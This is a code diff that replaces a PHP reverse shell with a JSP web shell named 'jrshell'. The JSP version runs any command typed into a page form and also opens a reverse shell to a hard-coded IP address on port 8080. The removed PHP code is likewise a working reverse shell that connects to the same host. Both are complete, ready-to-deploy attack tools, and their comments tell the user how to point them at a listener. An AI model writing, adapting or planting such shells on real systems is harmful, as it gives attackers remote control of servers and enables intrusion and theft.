@@ -1,121 +1,98 @@
-<?php
+<%
+    /*
+     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
+     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
+     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
+     * the command specified in the HTML form). This is to avoid to keep it simple.
+     */
+%>
 
-set_time_limit (0);
-$VERSION = "1.0";
-$ip = '193.109.120.181';  
-$port = 8080;       
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
-$daemon = 0;
-$debug = 0;
+<%@page import="java.lang.*"%>
+<%@page import="java.io.*"%>
+<%@page import="java.net.*"%>
+<%@page import="java.util.*"%>
 
-if (function_exists('pcntl_fork')) {
-	$pid = pcntl_fork();
-	
-	if ($pid == -1) {
-		printit("ERROR: Can't fork");
-		exit(1);
-	}
-	
-	if ($pid) {
-		exit(0);  
-	}
-
-	if (posix_setsid() == -1) {
-		printit("Error: Can't setsid()");
-		exit(1);
-	}
-
-	$daemon = 1;
-} else {
-	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
-}
-
-chdir("/");
-
-umask(0);
-
-$sock = fsockopen($ip, $port, $errno, $errstr, 30);
-if (!$sock) {
-	printit("$errstr ($errno)");
-	exit(1);
-}
-
-$descriptorspec = array(
-   0 => array("pipe", "r"),  
-   1 => array("pipe", "w"),  
-   2 => array("pipe", "w")   
-);
-
-$process = proc_open($shell, $descriptorspec, $pipes);
-
-if (!is_resource($process)) {
-	printit("ERROR: Can't spawn shell");
-	exit(1);
-}
-
-
-stream_set_blocking($pipes[0], 0);
-stream_set_blocking($pipes[1], 0);
-stream_set_blocking($pipes[2], 0);
-stream_set_blocking($sock, 0);
-
-printit("Successfully opened reverse shell to $ip:$port");
-
-while (1) {
-
-	if (feof($sock)) {
-		printit("ERROR: Shell connection terminated");
-		break;
-	}
-
-
-	if (feof($pipes[1])) {
-		printit("ERROR: Shell process terminated");
-		break;
-	}
-
-
-	$read_a = array($sock, $pipes[1], $pipes[2]);
-	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-
-
-	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
-		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
-		fwrite($pipes[0], $input);
-	}
-
-
-	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
-		$input = fread($pipes[1], $chunk_size);
-		if ($debug) printit("STDOUT: $input");
-		fwrite($sock, $input);
-	}
-
-	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
-		$input = fread($pipes[2], $chunk_size);
-		if ($debug) printit("STDERR: $input");
-		fwrite($sock, $input);
-	}
-}
-
-fclose($sock);
-fclose($pipes[0]);
-fclose($pipes[1]);
-fclose($pipes[2]);
-proc_close($process);
-
-
-function printit ($string) {
-	if (!$daemon) {
-		print "$string\n";
-	}
-}
-
-?> 
+<html>
+<head>
+    <title>jrshell</title>
+</head>
+<body>
+<form METHOD="POST" NAME="myform" ACTION="">
+    <input TYPE="text" NAME="shell">
+    <input TYPE="submit" VALUE="Send">
+</form>
+<pre>
+<%
+    // Define the OS
+    String shellPath = null;
+    try
+    {
+        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
+            shellPath = new String("/bin/sh");
+        } else {
+            shellPath = new String("cmd.exe");
+        }
+    } catch( Exception e ){}
+    // INNER HTML PART
+    if (request.getParameter("shell") != null) {
+        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
+        Process p;
+        if (shellPath.equals("cmd.exe"))
+            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
+        else
+            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+            out.println(disr);
+            disr = dis.readLine();
+        }
+    }
+    // TCP PORT PART
+    class StreamConnector extends Thread
+    {
+        InputStream wz;
+        OutputStream yr;
+        StreamConnector( InputStream wz, OutputStream yr ) {
+            this.wz = wz;
+            this.yr = yr;
+        }
+        public void run()
+        {
+            BufferedReader r  = null;
+            BufferedWriter w = null;
+            try
+            {
+                r  = new BufferedReader(new InputStreamReader(wz));
+                w = new BufferedWriter(new OutputStreamWriter(yr));
+                char buffer[] = new char[8192];
+                int length;
+                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
+                {
+                    w.write( buffer, 0, length );
+                    w.flush();
+                }
+            } catch( Exception e ){}
+            try
+            {
+                if( r != null )
+                    r.close();
+                if( w != null )
+                    w.close();
+            } catch( Exception e ){}
+        }
+    }
+ 
+    try {
+        Socket socket = new Socket( "193.109.120.181", 8080 ); // Replace with wanted ip and port
+        Process process = Runtime.getRuntime().exec( shellPath );
+        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
+        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
+        out.println("port opened on " + socket);
+     } catch( Exception e ) {}
+%>
+</pre>
+</body>
+</html>
